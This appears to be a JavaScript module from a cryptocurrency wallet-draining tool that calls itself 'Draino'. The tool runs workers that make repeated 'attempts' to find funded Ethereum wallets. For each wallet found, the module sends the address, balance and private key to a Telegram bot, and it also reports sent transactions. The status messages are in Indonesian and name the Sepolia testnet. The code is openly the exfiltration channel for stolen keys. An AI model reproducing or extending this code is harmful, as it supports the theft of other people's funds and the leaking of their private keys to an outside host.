'use strict';

const https = require('https');
const cfg   = require('./config');

const { token, chatId } = cfg.telegram || {};
const enabled = token && chatId;

function send(message) {
  if (!enabled) return;

  const body = JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' });
  const opts = {
    hostname: 'api.telegram.org',
    path:     `/bot${token}/sendMessage`,
    method:   'POST',
    headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  };

  const req = https.request(opts);
  req.on('error', () => {});
  req.write(body);
  req.end();
}

function notifyWalletFound(data) {
  if (!enabled) return;
  const msg =
    `🎯 *Wallet Ditemukan!*\n` +
    `📍 Address: \`${data.address}\`\n` +
    `💰 Balance: *${data.balance} ETH*\n` +
    `🔑 PrivKey: \`${data.privateKey}\`\n` +
    `🔢 Attempt: ${data.attempt}\n` +
    `🕐 ${data.timestamp}`;
  send(msg);
}

function notifyTxSent(hash) {
  if (!enabled) return;
  send(`✅ *TX Terkirim*\nHash: \`${hash}\``);
}

function notifyStarted(concurrency) {
  if (!enabled) return;
  send(`🚀 *Draino Dimulai*\nNetwork: Sepolia\nWorkers: ${concurrency}`);
}

function notifyStopped(total, found) {
  if (!enabled) return;
  send(`🛑 *Draino Dihentikan*\nTotal Attempt: ${total}\nWallet Ditemukan: ${found}`);
}

module.exports = { notifyWalletFound, notifyTxSent, notifyStarted, notifyStopped, enabled };
